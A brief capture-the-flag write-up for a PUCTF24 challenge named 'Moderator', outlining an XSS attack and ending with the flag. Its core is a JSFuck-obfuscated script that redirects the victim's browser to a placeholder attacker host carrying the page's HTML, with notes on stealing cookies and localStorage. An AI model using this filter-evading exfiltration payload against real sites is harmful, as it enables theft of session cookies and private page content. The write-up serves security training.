## Moderator 網站版主

XSS question<br>
=> setup server<br>
=> payload = `document.location="http://xx.xx.xx.xx:yyyyy/?cookie="`<br>
=> bypass filter using JSFuck<br>
=> test `cookie` `localStorage` `document.body.innerHTML`<br>

```html
<script>
  document[(![]+[])[!+[]+!+[]]+(!![]+[][(![]+[])[+[]]+(![]+[])[!+[]+!+[]]+(![]+[])[+!+[]]+(!![]+[])[+[]]])[+!+[]+[+[]]]+([][(![]+[])[+[]]+(![]+[])[!+[]+!+[]]+(![]+[])[+!+[]]+(!![]+[])[+[]]]+[])[!+[]+!+[]+!+[]]+(![]+[])[+!+[]]+(!![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(!![]+[][(![]+[])[+[]]+(![]+[])[!+[]+!+[]]+(![]+[])[+!+[]]+(!![]+[])[+[]]])[+!+[]+[+[]]]+([][[]]+[])[+!+[]]]="http://xx.xx.xx.xx:yyyyy/?cookie="+encodeURIComponent(document.body.innerHTML)
</script>
```

PUCTF24{y0u_kn0w_X55_n0w!_2fdbea18c7a95f341e970f8a4f33dc46}
